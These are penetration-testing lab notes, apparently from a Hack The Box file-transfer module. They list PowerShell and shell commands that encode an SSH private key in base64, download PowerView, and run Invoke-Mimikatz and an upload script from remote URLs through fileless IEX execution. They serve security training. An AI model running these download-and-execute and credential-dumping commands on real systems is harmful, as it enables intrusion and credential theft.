Pwnbox Check SSH Key MD5 Hash
  quesadilla123@htb[/htb]$ md5sum id_rsa
  
Pwnbox Encode SSH Key to Base64
  cat id_rsa |base64 -w 0;echo
  
Confirming the MD5 Hashes Match
  Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
  
PowerShell DownloadFile Method
  PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
  PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
  
PowerShell DownloadString - Fileless Method
  (Invoke-Expression cmdlet or the alias IEX)
  PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
  PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
  
PowerShell Invoke-WebRequest
  You can use the aliases iwr, curl, and wget instead of the Invoke-WebRequest full name.
  PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
  
  This can be bypassed using the parameter -UseBasicParsing.
  PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
  
  PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')



